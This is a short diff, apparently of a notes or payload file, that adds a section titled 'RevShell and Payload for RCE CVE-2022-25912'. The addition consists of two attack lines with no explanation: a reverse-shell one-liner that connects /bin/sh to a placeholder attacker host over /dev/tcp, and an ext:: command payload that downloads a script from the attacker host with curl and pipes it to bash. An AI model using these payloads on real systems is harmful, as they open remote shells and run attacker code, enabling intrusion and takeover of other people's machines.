@@ -33,3 +33,13 @@ script.addEventListener('load', function() {
     }
 });
 ~~~
+
+# RevShell and Payload for RCE CVE-2022-25912
+
+~~~
+/bin/sh -i >& /dev/tcp/<ATTACKER-IP>/PORT 0>&1
+~~~
+
+~~~
+ext::sh -c curl% http://<ATTACKER-IP>:SVR-PORT/formula.sh|bash >&2
+~~~
